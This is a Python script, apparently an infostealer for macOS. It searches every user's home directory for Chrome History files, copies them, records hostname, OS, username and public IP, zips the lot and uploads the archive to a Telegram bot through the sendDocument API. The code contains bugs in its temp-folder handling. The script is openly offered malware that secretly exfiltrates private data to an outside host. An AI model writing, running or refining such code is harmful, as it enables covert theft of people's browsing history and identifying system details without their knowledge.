import os
import requests
from pathlib import Path
import tempfile
import shutil
from datetime import datetime
import platform
import socket
import json

def get_directories():
    """ Enumerate the Chrome History Path for all users and return a list with the paths """
    history_path = []
    root_path = Path('/Users')

    try:
        for x in root_path.iterdir():
            if x.is_dir():
                chrome_data_path = x / "Library/Application Support/Google/Chrome/"
                for a in chrome_data_path.rglob('History'):
                    history_path.append(a)
    except PermissionError:
        pass

    return history_path

def copy_files_to_temp_folder(history_paths):
    """ Copy the history files to a temporary folder """
    with tempfile.TemporaryDirectory() as temp_folder:
        for path in history_paths:
            creation_time = datetime.fromtimestamp(path.stat().st_mtime)
            splited_directory = Path(path).parts
            if 'Snapshots' in splited_directory:
                directory = f'{temp_folder}/{creation_time}/{splited_directory[-4]}/{splited_directory[-2]}'   
            else:
                directory = f'{temp_folder}/{creation_time}/{splited_directory[-2]}'

            os.makedirs(directory, exist_ok=True)
            shutil.copy(path, directory)
        
        get_machine_info(temp_folder)
        
        with tempfile.TemporaryDirectory() as second_folder:
            compacted_file = f'{second_folder}/shh'
        # Compact the temporary folder
        
        shutil.make_archive(compacted_file, 'zip', temp_folder)

    send_to_telegram(compacted_file)

    os.remove(second_folder)

    return None

def get_machine_info(x):
    """ Get basic information about the host """
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except requests.RequestException as e:
        public_ip = f"Error fetching public IP: {e}"
    
    system_info = {
        "Hostname": socket.gethostname(),
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture()[0],
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Public IP Address": public_ip,
        "Username": os.getlogin(),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    with open(f'{x}/info.json', 'w') as file:
        json.dump(system_info, file, indent=4)

    return None

def send_to_telegram(zip_file):
    bot_token = 'x'
    chat_id = 'a'
    file_path = f'{zip_file}.zip'

# Send the file to the chat
    with open(file_path, 'rb') as file:
        response = requests.post(
            f'https://api.telegram.org/bot{bot_token}/sendDocument',
            data={'chat_id': chat_id},
            files={'document': file}
        )
        
    return None

if __name__ == '__main__':
    history_path = get_directories()
    copy_files_to_temp_folder(history_path)
